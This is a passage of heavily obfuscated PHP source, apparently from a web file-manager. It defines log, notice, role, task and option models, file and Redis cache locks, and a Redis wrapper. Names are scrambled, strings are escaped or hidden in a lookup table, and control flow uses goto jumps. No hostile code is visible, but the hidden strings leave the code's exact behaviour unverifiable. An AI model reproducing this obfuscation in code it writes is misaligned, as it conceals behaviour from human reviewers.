json_decode($âÇ©şá[$í¯†­ÃÆ[503]], !0); if ($âÇ©şá[$í¯†­ÃÆ[43]] == $í¯†­ÃÆ[1857]) { $®şõÊÀ› = $this->descZipDownload($®şõÊÀ›, $¤û¯ø½); $–Ä±†¶[$Ø‘ôÂ«][$í¯†­ÃÆ[503]] = json_encode($®şõÊÀ›); continue; } if (strpos($âÇ©şá[$í¯†­ÃÆ[43]], $í¯†­ÃÆ[2113]) !== 0) { if (!isset($®şõÊÀ›[$í¯†­ÃÆ[94]]) || strpos($âÇ©şá[$í¯†­ÃÆ[43]], $í¯†­ÃÆ[2313]) !== 0) { continue; } try { $ÖÇèÎñ‹ = IO::infoFullSimple($®şõÊÀ›[$í¯†­ÃÆ[94]]); } catch (Exception $ä¥‘¨Œæ) { continue; } $¤û¯ø½[] = $®şõÊÀ›[$í¯†­ÃÆ[191]] = $ÖÇèÎñ‹[$í¯†­ÃÆ[191]]; $¤û¯ø½[] = $®şõÊÀ›[$í¯†­ÃÆ[2111]] = $ÖÇèÎñ‹[$í¯†­ÃÆ[190]]; $–Ä±†¶[$Ø‘ôÂ«][$í¯†­ÃÆ[503]] = json_encode($®şõÊÀ›); continue; } $¤û¯ø½[] = $®şõÊÀ›[$í¯†­ÃÆ[191]]; $¤û¯ø½[] = $®şõÊÀ›[$í¯†­ÃÆ[2111]]; if ($®şõÊÀ›[$í¯†­ÃÆ[43]] == $í¯†­ÃÆ[597]) { $¤û¯ø½[] = $®şõÊÀ›[$í¯†­ÃÆ[503]][$í¯†­ÃÆ[1201]]; $¤û¯ø½[] = $®şõÊÀ›[$í¯†­ÃÆ[503]][$í¯†­ÃÆ[1202]]; } if ($®şõÊÀ›[$í¯†­ÃÆ[43]] == $í¯†­ÃÆ[2121]) { $¤û¯ø½[] = $®şõÊÀ›[$í¯†­ÃÆ[503]][$í¯†­ÃÆ[191]]; } } if (!$¤û¯ø½) { return array(); } return Model($í¯†­ÃÆ[865])->sourceListInfo($¤û¯ø½, !0); } private function logList($ä»”ØÍÙ) { $ ¥íù‰Ø =& $_SERVER[ú÷îèÆÜ]; $¡ÌÈ˜Œ = array_to_keyvalue($ä»”ØÍÙ, $ ¥íù‰Ø[22], $ ¥íù‰Ø[1685]); $àÜ¸’…÷ = Model($ ¥íù‰Ø[576])->userListInfo(array_unique($¡ÌÈ˜Œ)); $ê½¬ÕÈ¨ = $this->getSourceList($ä»”ØÍÙ); $Ì´ÉÀƒ¡ = $this->typeAll(); $Ë¼ˆ¡°ú = array(); $•ñšü–Ó = array(); foreach ($ä»”ØÍÙ as $ÜÒ²Õ¢¡ => $…¼Ì) { $ï¯–éÒõ = $…¼Ì[$ ¥íù‰Ø[43]]; $ıŒß²“î = isset($àÜ¸’…÷[$…¼Ì[$ ¥íù‰Ø[1685]]]) ? $àÜ¸’…÷[$…¼Ì[$ ¥íù‰Ø[1685]]] : !1; $È£ñÀ÷³ = strpos($ï¯–éÒõ, $ ¥íù‰Ø[2314]) === 0 ? LNG($ ¥íù‰Ø[2315]) : LNG($ ¥íù‰Ø[2310]); $…¼Ì[$ ¥íù‰Ø[42]] = isset($ıŒß²“î[$ ¥íù‰Ø[42]]) ? $ıŒß²“î[$ ¥íù‰Ø[42]] : LNG($ ¥íù‰Ø[2310]); $…¼Ì[$ ¥íù‰Ø[2165]] = isset($ıŒß²“î[$ ¥íù‰Ø[2165]]) ? $ıŒß²“î[$ ¥íù‰Ø[2165]] : $ ¥íù‰Ø[22]; $…¼Ì[$ ¥íù‰Ø[1582]] = isset($Ì´ÉÀƒ¡[$ï¯–éÒõ]) ? $Ì´ÉÀƒ¡[$ï¯–éÒõ] : $È£ñÀ÷³; $…¼Ì[$ ¥íù‰Ø[2055]] = $ıŒß²“î; $§Ñà†û = json_decode($…¼Ì[$ ¥íù‰Ø[503]], !0); $…¼Ì[$ ¥íù‰Ø[2307]] = isset($§Ñà†û[$ ¥íù‰Ø[2307]]) ? $§Ñà†û[$ ¥íù‰Ø[2307]] : $ ¥íù‰Ø[22]; $…¼Ì[$ ¥íù‰Ø[2311]] = IpLocation::get($…¼Ì[$ ¥íù‰Ø[2307]]); if (strpos($ï¯–éÒõ, $ ¥íù‰Ø[2113]) === 0 || isset($§Ñà†û[$ ¥íù‰Ø[2111]])) { $§Ñà†û[$ ¥íù‰Ø[97]] = $ê½¬ÕÈ¨[$§Ñà†û[$ ¥íù‰Ø[191]]]; $§Ñà†û[$ ¥íù‰Ø[2126]] = $ê½¬ÕÈ¨[$§Ñà†û[$ ¥íù‰Ø[2111]]]; if ($§Ñà†û[$ ¥íù‰Ø[43]] == $ ¥íù‰Ø[597]) { $§Ñà†û[$ ¥íù‰Ø[503]][$ ¥íù‰Ø[1201]] = $ê½¬ÕÈ¨[$§Ñà†û[$ ¥íù‰Ø[503]][$ ¥íù‰Ø[1201]]]; $§Ñà†û[$ ¥íù‰Ø[503]][$ ¥íù‰Ø[1202]] = $ê½¬ÕÈ¨[$§Ñà†û[$ ¥íù‰Ø[503]][$ ¥íù‰Ø[1202]]]; } if ($§Ñà†û[$ ¥íù‰Ø[43]] == $ ¥íù‰Ø[2121]) { $§Ñà†û[$ ¥íù‰Ø[503]][$ ¥íù‰Ø[191]] = $ê½¬ÕÈ¨[$§Ñà†û[$ ¥íù‰Ø[503]][$ ¥íù‰Ø[191]]]; } if ($§Ñà†û[$ ¥íù‰Ø[43]] == $ ¥íù‰Ø[1852]) { $§Ñà†û[$ ¥íù‰Ø[2126]] = $§Ñà†û[$ ¥íù‰Ø[97]]; $§Ñà†û[$ ¥íù‰Ø[2111]] = $§Ñà†û[$ ¥íù‰Ø[2126]][$ ¥íù‰Ø[191]]; $§Ñà†û[$ ¥íù‰Ø[97]] = !1; $§Ñà†û[$ ¥íù‰Ø[191]] = $ ¥íù‰Ø[22]; } if ($§Ñà†û[$ ¥íù‰Ø[97]] && $§Ñà†û[$ ¥íù‰Ø[97]][$ ¥íù‰Ø[188]] == $ ¥íù‰Ø[189]) { $•ñšü–Ó[] = $…¼Ì[$ ¥íù‰Ø[452]]; unset($ä»”ØÍÙ[$ÜÒ²Õ¢¡]); continue; } if ($§Ñà†û[$ ¥íù‰Ø[2126]] && $§Ñà†û[$ ¥íù‰Ø[2126]][$ ¥íù‰Ø[188]] == $ ¥íù‰Ø[189]) { $•ñšü–Ó[] = $…¼Ì[$ ¥íù‰Ø[452]]; unset($ä»”ØÍÙ[$ÜÒ²Õ¢¡]); continue; } } $…¼Ì[$ ¥íù‰Ø[503]] = $§Ñà†û; unset($…¼Ì[$ ¥íù‰Ø[2316]]); $Ë¼ˆ¡°ú[] = $…¼Ì; } $this->clearSystemPathLog($•ñšü–Ó); return $Ë¼ˆ¡°ú; } private function clearSystemPathLog($¯ÜØ›¤è) { $Š¹Àñ®Á =& $_SERVER[ú÷îèÆÜ]; if (count($¯ÜØ›¤è) == 0) { return; } $´àÈôÒˆ = array($Š¹Àñ®Á[452] => array($Š¹Àñ®Á[17], array_unique($¯ÜØ›¤è))); $this->where($´àÈôÒˆ)->delete(); } public function deviceList($Ä¥†Ê¶, $œ±Ü»ÇÂ = 0) { $×ÖÑäã¶ =& $_SERVER[ú÷îèÆÜ]; $üû•ÌÉç = array($×ÖÑäã¶[1685] => $Ä¥†Ê¶, $×ÖÑäã¶[225] => array($×ÖÑäã¶[1055], $œ±Ü»ÇÂ), $×ÖÑäã¶[43] => $×ÖÑäã¶[1826]); $ñÒñóÕ = array(); $Ğò‡øş = $this->field($×ÖÑäã¶[2317])->where($üû•ÌÉç)->order($×ÖÑäã¶[2124])->limit(50)->select(); foreach ($Ğò‡øş as $â¨•Â¶ƒ => $àÛ´İÔ–) { if ($â¨•Â¶ƒ > 0 && abs($àÛ´İÔ–[$×ÖÑäã¶[225]] - $Ğò‡øş[$â¨•Â¶ƒ - 1][$×ÖÑäã¶[225]]) < 5) { continue; } $ÒâË´Š = json_decode($àÛ´İÔ–[$×ÖÑäã¶[503]], !0); $àÛ´İÔ–[$×ÖÑäã¶[2307]] = isset($ÒâË´Š[$×ÖÑäã¶[2307]]) ? $ÒâË´Š[$×ÖÑäã¶[2307]] : $×ÖÑäã¶[22]; unset($ÒâË´Š[$×ÖÑäã¶[2307]]); $‚ÙÌ×¿ = $this->deviceType($ÒâË´Š[$×ÖÑäã¶[2114]]); if (isset($ñÒñóÕ[$‚ÙÌ×¿])) { continue; } $àÛ´İÔ–[$×ÖÑäã¶[2311]] = IpLocation::get($àÛ´İÔ–[$×ÖÑäã¶[2307]]); $àÛ´İÔ–[$×ÖÑäã¶[503]] = $ÒâË´Š; $ñÒñóÕ[$‚ÙÌ×¿] = $àÛ´İÔ–; } return array_values($ñÒñóÕ); } public function deviceType($ô’›Ãéù) { return $ô’›Ãéù; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x6e\x6f\x74\x69\143\145\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\143\157\156\164\x65\x6e\x74", "\x61\x75\x74\150", "\155\x6f\x64\x65", "\x74\x69\x6d\145", "\164\171\160\145", "\154\x65\166\145\154", "\x65\156\x61\x62\x6c\x65", "\x73\x6f\162\164"); public function listData($—‘Ğ•Ìï = false, $”Íã£¨ = "\163\157\x72\164", $Èøè¹ = false) { return parent::listData($—‘Ğ•Ìï, $”Íã£¨, $Èøè¹); } public function add($£©œ·Ü) { $šŠâ‰ş­ =& $_SERVER[ú÷îèÆÜ]; $¥û”Şñ‹ = time(); if ($£©œ·Ü[$šŠâ‰ş­[26]] == $šŠâ‰ş­[2318]) { $¥û”Şñ‹ = strtotime($£©œ·Ü[$šŠâ‰ş­[204]]); } $£©œ·Ü[$šŠâ‰ş­[204]] = $¥û”Şñ‹; return parent::insert($£©œ·Ü); } public function update($è¨¼‹Ò, $¥§„ñü) { $òè¶ñÚä =& $_SERVER[ú÷îèÆÜ]; $åòƒá¼¡ = $this->listData($è¨¼‹Ò); if (!$åòƒá¼¡) { return !1; } $œ¡ùÀÅ÷ = time(); if ($¥§„ñü[$òè¶ñÚä[26]] == $òè¶ñÚä[2318]) { $œ¡ùÀÅ÷ = strtotime($¥§„ñü[$òè¶ñÚä[204]]); } $¥§„ñü[$òè¶ñÚä[204]] = $œ¡ùÀÅ÷; return parent::update($è¨¼‹Ò, $¥§„ñü); } public function remove($¼Ç…« û) { $ó¬µ¨ = $this->listData($¼Ç…« û); if (!$ó¬µ¨ || $ó¬µ¨[$_SERVER[ú÷îèÆÜ][189]]) { return !1; } return parent::remove($¼Ç…« û); } public function sort($«–¤é—ã, $Ùö›‹Õ¡) { return parent::update($«–¤é—ã, $Ùö›‹Õ¡); } public function enable($¯°ùó§, $œ‚çÅÆ) { return parent::update($¯°ùó§, array($_SERVER[ú÷îèÆÜ][2319] => $œ‚çÅÆ)); } private function initUserOption() { $¤ŸÙÛƒ  =& $_SERVER[ú÷îèÆÜ]; $this->optionType = $¤ŸÙÛƒ [2320]; $this->modelType = $¤ŸÙÛƒ [2321]; $this->field = array($¤ŸÙÛƒ [2322], $¤ŸÙÛƒ [42], $¤ŸÙÛƒ [204], $¤ŸÙÛƒ [43], $¤ŸÙÛƒ [2323], $¤ŸÙÛƒ [790], $¤ŸÙÛƒ [220]); } public function userNoticeGet($Õõ½ˆÎ¸ = false) { $this->initUserOption(); return parent::listData($Õõ½ˆÎ¸, $_SERVER[ú÷îèÆÜ][452], !0); } public function userNoticeAdd($‚˜“„Ú¨) { $ÍÆì¤²« =& $_SERVER[ú÷îèÆÜ]; $this->initUserOption(); $öæ”¨şå = $this->findByKey($ÍÆì¤²«[2322], $‚˜“„Ú¨[$ÍÆì¤²«[452]]); if ($öæ”¨şå) { return !0; } $Ì¨á„Úê = array($ÍÆì¤²«[2322] => $‚˜“„Ú¨[$ÍÆì¤²«[452]], $ÍÆì¤²«[42] => $‚˜“„Ú¨[$ÍÆì¤²«[42]], $ÍÆì¤²«[204] => $‚˜“„Ú¨[$ÍÆì¤²«[204]], $ÍÆì¤²«[43] => isset($‚˜“„Ú¨[$ÍÆì¤²«[43]]) ? $‚˜“„Ú¨[$ÍÆì¤²«[43]] : 1, $ÍÆì¤²«[2323] => isset($‚˜“„Ú¨[$ÍÆì¤²«[2323]]) ? $‚˜“„Ú¨[$ÍÆì¤²«[2323]] : 0, $ÍÆì¤²«[790] => 0, $ÍÆì¤²«[220] => 0); return parent::insert($Ì¨á„Úê); } public function userNoticeEdit($ìÄ‡¼, $Ì³²Æø•) { $this->initUserOption(); return parent::update($ìÄ‡¼, $Ì³²Æø•); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\x74\x65\x6d\137\x6f\160\x74\151\157\156"; protected $jsonField = array("\155\x65\156\x75", "\x72\x6f\x6c\145", "\x72\x6f\154\x65\x47\x72\157\165\160", "\162\145\x67\x69\x73\x74", "\x65\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($Ÿ‚Ç†Ú) { return "\x53\171\x73\164\x65\155\x4f\x70\x74\151\x6f\x6e\x5f{$Ÿ‚Ç†Ú}"; } protected function optionDefault($‰ˆÉä¬® = '') { $Ó‘óû¾ =& $_SERVER[ú÷îèÆÜ]; if ($‰ˆÉä¬® == $Ó‘óû¾[22]) { return $GLOBALS[$Ó‘óû¾[16]][$Ó‘óû¾[434]]; } } } goto dìç¤í³’ç; Dã‰Ùí¸ñ¡: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $‹€ªÎ¥” =& $_SERVER[ú÷îèÆÜ]; $µ‚º«±² = $GLOBALS[$‹€ªÎ¥”[16]][$‹€ªÎ¥”[402]]; self::$cachePath = $µ‚º«±²[$‹€ªÎ¥”[224]][$‹€ªÎ¥”[94]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ê—ı´ÓŠ, $§Ñ‘ş¬ = 0) { $ˆ´À”› =& $_SERVER[ú÷îèÆÜ]; $ÕÆìè¸‘ = microtime(!0); $“ª¸ÏÏÕ = $ÕÆìè¸‘ + $§Ñ‘ş¬ + 0.0001; $¹°»µáÃ = rtrim(self::$cachePath, $ˆ´À”›[18]) . $ˆ´À”›[904] . md5($ê—ı´ÓŠ) . $ˆ´À”›[901]; if (file_exists($¹°»µáÃ) && filemtime($¹°»µáÃ) && filemtime($¹°»µáÃ) < time() - 10) { @unlink($¹°»µáÃ); } do { if (file_exists($¹°»µáÃ)) { cacheLockWait(); continue; } $ïª¢§ƒ = fopen($¹°»µáÃ, $ˆ´À”›[905]); if (!$ïª¢§ƒ) { return !1; } $Â‚Œ´¸Œ = flock($ïª¢§ƒ, LOCK_EX | LOCK_NB); self::$caches[$ê—ı´ÓŠ] = array($ˆ´À”›[906] => $ïª¢§ƒ, $ˆ´À”›[224] => $¹°»µáÃ); fwrite($ïª¢§ƒ, $“ª¸ÏÏÕ); clearstatcache(); if ($ïª¢§ƒ && $Â‚Œ´¸Œ) { return !0; } cacheLockWait(); } while (microtime(!0) < $“ª¸ÏÏÕ); $this->unlock($ê—ı´ÓŠ); return !1; } public function lockGet($¶Ôğ„©) { $ÉÂì§« =& $_SERVER[ú÷îèÆÜ]; $„Œì¬ô½ = rtrim(self::$cachePath, $ÉÂì§«[18]) . $ÉÂì§«[904] . md5($¶Ôğ„©) . $ÉÂì§«[901]; return file_exists($„Œì¬ô½); } public function unlock($¼çœ‚ı) { $àµÜóÎ· =& $_SERVER[ú÷îèÆÜ]; $·ÃÈ¢ÇÊ = self::$caches[$¼çœ‚ı]; if (!$·ÃÈ¢ÇÊ) { return; } @flock($·ÃÈ¢ÇÊ[$àµÜóÎ·[906]], LOCK_UN); @fclose($·ÃÈ¢ÇÊ[$àµÜóÎ·[906]]); @unlink($·ÃÈ¢ÇÊ[$àµÜóÎ·[224]]); unset(self::$caches[$¼çœ‚ı]); } } class CacheLockRedis { public function lock($ÜÓ±ŸÃ’, $üğÁà·Ô = 10) { $¥¹ìŞšõ = Cache::init(); $‘ò×àèè = microtime(!0) + $üğÁà·Ô; while (microtime(!0) < $‘ò×àèè) { $£è«‰à = $¥¹ìŞšõ->get($ÜÓ±ŸÃ’); if (!$£è«‰à) { $î˜˜ü–› = $¥¹ìŞšõ->setLock($ÜÓ±ŸÃ’, $‘ò×àèè, $üğÁà·Ô); if ($î˜˜ü–›) { return !0; } } else { if ($£è«‰à < microtime(!0)) { $¥¹ìŞšõ->set($ÜÓ±ŸÃ’, $‘ò×àèè, $üğÁà·Ô * 2); if ($¥¹ìŞšõ->get($ÜÓ±ŸÃ’) === $£è«‰à) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($©’ÉßÌœ) { return Cache::init()->get($©’ÉßÌœ); } public function unlock($¿æ˜Ãñô) { return Cache::init()->remove($¿æ˜Ãñô); } } goto cÚƒ»¼ïÅ; dìç¤í³’ç: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\162\157\x6c\145\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\x65", "\x61\x75\x74\150", "\x6c\x61\142\145\x6c", "\x64\151\163\160\x6c\x61\171", "\x73\x79\163\164\145\x6d", "\144\145\x73\x63", "\151\147\156\x6f\x72\145\105\x78\164", "\x69\147\156\157\x72\x65\106\151\x6c\145\123\x69\172\x65", "\x61\x64\x6d\x69\156\x69\163\164\162\x61\164\x6f\162", "\163\x6f\162\x74"); public function listData($´ªè«ÎÅ = false, $²È¸ØÛ¸ = "\x73\157\162\x74", $—ïîÃ”Æ = false) { $˜ä÷Ğ =& $_SERVER[ú÷îèÆÜ]; $Å¤Ì‘Ó = parent::listData($´ªè«ÎÅ, $²È¸ØÛ¸, $—ïîÃ”Æ); if (!$´ªè«ÎÅ) { foreach ($Å¤Ì‘Ó as $¶â°äù => $åª­ÍªÆ) { if ($åª­ÍªÆ[$˜ä÷Ğ[2085]] == 1) { $Å¤Ì‘Ó[$¶â°äù][$˜ä÷Ğ[503]] = LNG($˜ä÷Ğ[2324]); } } } return $Å¤Ì‘Ó; } public function update($¾‹â‚”Ñ, $­Üû‚ˆÇ) { $…¥Ì¿³Ë =& $_SERVER[ú÷îèÆÜ]; $›û‹øƒÆ = parent::listData($¾‹â‚”Ñ); $—ó¥•…Æ = $this->findByName($­Üû‚ˆÇ[$…¥Ì¿³Ë[42]]); if (!$›û‹øƒÆ || $—ó¥•…Æ && $—ó¥•…Æ[$…¥Ì¿³Ë[452]] != $›û‹øƒÆ[$…¥Ì¿³Ë[452]]) { return !1; } if ($—ó¥•…Æ[$…¥Ì¿³Ë[2085]] == 1) { $­Üû‚ˆÇ = array($…¥Ì¿³Ë[42] => $­Üû‚ˆÇ[$…¥Ì¿³Ë[42]], $…¥Ì¿³Ë[1906] => $­Üû‚ˆÇ[$…¥Ì¿³Ë[1906]]); } $this->filterAuth($­Üû‚ˆÇ[$…¥Ì¿³Ë[464]]); return parent::update($¾‹â‚”Ñ, $­Üû‚ˆÇ); } public function remove($ÛÚˆË›Î) { $ïòœÕâ = parent::listData($ÛÚˆË›Î); if (!$ïòœÕâ || $ïòœÕâ[$_SERVER[ú÷îèÆÜ][189]]) { return !1; } return parent::remove($ÛÚˆË›Î); } public function add($É¸Õô»‹) { $‘á£®¾ =& $_SERVER[ú÷îèÆÜ]; $­êÒ‰ßœ = $É¸Õô»‹[$‘á£®¾[42]]; if ($this->findByName($­êÒ‰ßœ)) { return !1; } $‡É‡¼‚È = array($‘á£®¾[471] => $­êÒ‰ßœ, $‘á£®¾[1889] => $‘á£®¾[22], $‘á£®¾[1885] => $‘á£®¾[1893], $‘á£®¾[2325] => 1, $‘á£®¾[1888] => 0, $‘á£®¾[2326] => 0, $‘á£®¾[1887] => $this->getSort()); $É¸Õô»‹ = array_merge($‡É‡¼‚È, $É¸Õô»‹); $this->filterAuth($É¸Õô»‹[$‘á£®¾[464]]); return parent::insert($É¸Õô»‹); } private function getSort() { $úŞ•¤âæ =& $_SERVER[ú÷îèÆÜ]; $ÎÚšÈ²ª = parent::listData(); $Ç«Íöì = array_to_keyvalue($ÎÚšÈ²ª, $úŞ•¤âæ[22], $úŞ•¤âæ[1907]); return empty($Ç«Íöì) ? 0 : max($Ç«Íöì) + 1; } private function filterAuth(&$É³®ÛÂÎ) { $¿÷•¡Şœ =& $_SERVER[ú÷îèÆÜ]; $ÊÍ¶è¬¼ = array(); $ä§Ö™ªÊ = array_filter(explode($¿÷•¡Şœ[60], $É³®ÛÂÎ)); foreach ($ä§Ö™ªÊ as $É³®ÛÂÎ) { $—Ò‡ş¹ = explode($¿÷•¡Şœ[20], $É³®ÛÂÎ); if ($—Ò‡ş¹[0] == $¿÷•¡Şœ[2327] && $—Ò‡ş¹[1] != $¿÷•¡Şœ[1231]) { $Ø×¿ = $—Ò‡ş¹[0] . $¿÷•¡Şœ[20] . $—Ò‡ş¹[1] . $¿÷•¡Şœ[2328]; if (!in_array($Ø×¿, $ä§Ö™ªÊ)) { $ÊÍ¶è¬¼[] = $Ø×¿; } } $ÊÍ¶è¬¼[] = $É³®ÛÂÎ; } $É³®ÛÂÎ = implode($¿÷•¡Şœ[60], $ÊÍ¶è¬¼); } public function findRoleDefault() { $©é¸À´ =& $_SERVER[ú÷îèÆÜ]; $İ¬êí¾à = parent::listData(); $˜ ÖÑÍ = !1; foreach ($İ¬êí¾à as $Ëá¸÷å–) { if (!$Ëá¸÷å– || $Ëá¸÷å–[$©é¸À´[1905]] == $©é¸À´[222] || $Ëá¸÷å–[$©é¸À´[2085]] == 1) { continue; } if (strstr($Ëá¸÷å–[$©é¸À´[464]], $©é¸À´[2329])) { continue; } if (!strstr($Ëá¸÷å–[$©é¸À´[464]], $©é¸À´[2330])) { continue; } if (!$˜ ÖÑÍ) { $˜ ÖÑÍ = $Ëá¸÷å–; continue; } $¼Ø•–ìµ = explode($©é¸À´[60], $˜ ÖÑÍ[$©é¸À´[464]]); $ú˜·±¸¸ = explode($©é¸À´[60], $Ëá¸÷å–[$©é¸À´[464]]); if (count($¼Ø•–ìµ) > count($ú˜·±¸¸)) { $˜ ÖÑÍ = $Ëá¸÷å–; } } return $˜ ÖÑÍ ? $˜ ÖÑÍ[$©é¸À´[452]] : $©é¸À´[22]; } public function sort($£…ƒÀô, $©ĞíÂÈ) { return parent::update($£…ƒÀô, $©ĞíÂÈ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\164\x61\x73\153\x4c\151\163\164"; public $field = array("\156\141\155\x65", "\164\x79\160\145", "\145\x76\x65\156\164", "\164\151\155\x65", "\144\x65\163\x63", "\x73\171\x73\x74\x65\x6d", "\145\156\141\x62\x6c\145", "\154\x61\x73\x74\122\165\156", "\163\157\162\x74"); public function listData($ÏÈíÂëĞ = false, $„ùìá¶ = "\x73\x6f\162\164", $‰²¶è¯¬ = false) { return parent::listData($ÏÈíÂëĞ, $„ùìá¶, $‰²¶è¯¬); } public function add($ôòøäãÖ) { $Ú“ËÂÉï =& $_SERVER[ú÷îèÆÜ]; $’ˆÜ¨Ä† = $this->findByName($ôòøäãÖ[$Ú“ËÂÉï[42]]); if ($’ˆÜ¨Ä†) { return !1; } $ôòøäãÖ[$Ú“ËÂÉï[1642]] = 0; $ôòøäãÖ[$Ú“ËÂÉï[1907]] = $this->getSort(); return parent::insert($ôòøäãÖ); } private function getSort() { $ó²£”Í— =& $_SERVER[ú÷îèÆÜ]; $—Çº­Ê§ = parent::listData(); $´çæ£ĞÜ = array_to_keyvalue($—Çº­Ê§, $ó²£”Í—[22], $ó²£”Í—[1907]); return empty($´çæ£ĞÜ) ? 0 : max($´çæ£ĞÜ) + 1; } public function update($áŠÂ··Õ, $Ïûóáä–) { $Î‘’…ûñ =& $_SERVER[ú÷îèÆÜ]; $ôı©Æûü = $this->listData($áŠÂ··Õ); $‚ç˜ÈÀš = $this->findByName($Ïûóáä–[$Î‘’…ûñ[42]]); if (!$ôı©Æûü || $‚ç˜ÈÀš && $‚ç˜ÈÀš[$Î‘’…ûñ[452]] != $ôı©Æûü[$Î‘’…ûñ[452]]) { return !1; } return parent::update($áŠÂ··Õ, $Ïûóáä–); } public function remove($ğÀ‡ó›, $‡šŸÍ½Ó = false) { $ÄÀûˆïù =& $_SERVER[ú÷îèÆÜ]; $å—–Ë÷Î = $this->listData($ğÀ‡ó›); if (!$å—–Ë÷Î) { return; } if (!$‡šŸÍ½Ó && $å—–Ë÷Î[$ÄÀûˆïù[189]] == $ÄÀûˆïù[98]) { return !1; } return parent::remove($ğÀ‡ó›); } public function enable($Áğ úÜİ, $“í£Í´¢) { return $this->update($Áğ úÜİ, array($_SERVER[ú÷îèÆÜ][2319] => $“í£Í´¢)); } public function run($èÀ‘ÜƒŠ) { return $this->update($èÀ‘ÜƒŠ, array($_SERVER[ú÷îèÆÜ][2331] => time())); } } goto B¥Âà¶™œ‹; F‡ãµ”Õ–: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($”¦øä™ó, $Ñ½ê×À) { $²ıŸ¯šì =& $_SERVER[ú÷îèÆÜ]; if (!class_exists($²ıŸ¯šì[910])) { show_json($²ıŸ¯šì[911], !1); } $this->cacheTime = $Ñ½ê×À; $€‰Ùœæ¡ = isset($”¦øä™ó[$²ıŸ¯šì[912]]) ? $”¦øä™ó[$²ıŸ¯šì[912]] : 10; $—ßÀ ´é = _get($”¦øä™ó, $²ıŸ¯šì[909]); if ($—ßÀ ´é && is_array($—ßÀ ´é)) { $this->initCluster($”¦øä™ó, $€‰Ùœæ¡); } else { $this->handle = $this->init($”¦øä™ó, $€‰Ùœæ¡); } } private function init($–ÙĞˆİê, $—åßç²Ş) { $ÕÇ½ÜèÁ =& $_SERVER[ú÷îèÆÜ]; $ñÒ¬§ãİ = new Redis(); $ İáç— = isset($–ÙĞˆİê[$ÕÇ½ÜèÁ[913]]) ? $–ÙĞˆİê[$ÕÇ½ÜèÁ[913]] : !1; if ($ İáç—) { $ñÒ¬§ãİ->pconnect($–ÙĞˆİê[$ÕÇ½ÜèÁ[206]], $–ÙĞˆİê[$ÕÇ½ÜèÁ[207]], $—åßç²Ş); } else { $ñÒ¬§ãİ->connect($–ÙĞˆİê[$ÕÇ½ÜèÁ[206]], $–ÙĞˆİê[$ÕÇ½ÜèÁ[207]], $—åßç²Ş); } if (!empty($–ÙĞˆİê[$ÕÇ½ÜèÁ[464]])) { $ñÒ¬§ãİ->auth($–ÙĞˆİê[$ÕÇ½ÜèÁ[464]]); } if (!empty($–ÙĞˆİê[$ÕÇ½ÜèÁ[797]]) && $–ÙĞˆİê[$ÕÇ½ÜèÁ[797]] != 0) { $ñÒ¬§ãİ->select($–ÙĞˆİê[$ÕÇ½ÜèÁ[797]]); } return $ñÒ¬§ãİ; } private function initCluster($ì¨™—Õå, $ ¤ÅĞÄ) { $ş¬º° =& $_SERVER[ú÷îèÆÜ]; $üØ™„ì• = array($ş¬º°[914], $ş¬º°[915], $ş¬º°[916]); $ªÑ°™Ÿ = $ş¬º°[914]; if (isset($ì¨™—Õå[$ş¬º°[26]]) && in_array($ì¨™—Õå[$ş¬º°[26]], $üØ™„ì•)) { $ªÑ°™Ÿ = $ì¨™—Õå[$ş¬º°[26]]; } switch ($ªÑ°™Ÿ) { case $ş¬º°[914]: $this->_slave($ì¨™—Õå, $ ¤ÅĞÄ); break; case $ş¬º°[915]: break; case $ş¬º°[916]: $this->isCluster = !0; $íï–š‰Ô = $ì¨™—Õå[$ş¬º°[909]]; $òˆĞ†ùÙ = isset($ì¨™—Õå[$ş¬º°[913]]) ? $ì¨™—Õå[$ş¬º°[913]] : !1; $äÒ˜¸íŸ = isset($ì¨™—Õå[$ş¬º°[464]]) ? $ì¨™—Õå[$ş¬º°[464]] : null; $this->handle = new RedisCluster(NUll, $íï–š‰Ô, $ ¤ÅĞÄ, $ ¤ÅĞÄ, $òˆĞ†ùÙ, $äÒ˜¸íŸ); break; default: break; } } private function _slave($½à»Í­, $Î‹“™û‰) { $şÈû”×¼ = $½à»Í­[$_SERVER[ú÷îèÆÜ][909]]; $this->filterConfig($½à»Í­, $şÈû”×¼[0]); $this->handle = $this->init($½à»Í­, $Î‹“™û‰); unset($şÈû”×¼[0]); if (empty($şÈû”×¼)) { return; } $ğûœìÅş = array_rand($şÈû”×¼); $this->filterConfig($½à»Í­, $şÈû”×¼[$ğûœìÅş]); $this->slaveHandle = $this->init($½à»Í­, $Î‹“™û‰); } private function filterConfig(&$¸Ë£É€ˆ, $è¾½“Ø¿) { $Ó­Çşä¹ =& $_SERVER[ú÷îèÆÜ]; $ø±»÷¤ = explode($Ó­Çşä¹[4], $è¾½“Ø¿); $§ÔÈÆŞ‡ = array($Ó­Çşä¹[206] => $ø±»÷¤[0], $Ó­Çşä¹[207] => $ø±»÷¤[1]); $¸Ë£É€ˆ = array_merge($¸Ë£É€ˆ, $§ÔÈÆŞ‡); } public function set($î·ÑÌÂÑ, $ı•šá®, $£¢¨…Ï = false) { $£¢¨…Ï = $£¢¨…Ï ? $£¢¨…Ï : $this->cacheTime; return $this->handle->setEx($î·ÑÌÂÑ, $£¢¨…Ï, $ı•šá®); } public function setLock($š‹ƒ¿·á, $·òšô´, $ğëªÖûâ) { return $this->handle->setNX($š‹ƒ¿·á, $·òšô´); } public function get($Ÿ‚Ã¹£Ô) { $äàÀ»½ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $äàÀ»½->get($Ÿ‚Ã¹£Ô); } public function remove($ÒåÀ¾Â) { return $this->handle->del($ÒåÀ¾Â); } public function deleteAll() { $ÙÊƒ½¬¹ =& $_SERVER[ú÷îèÆÜ]; $€åãº¡Ş = 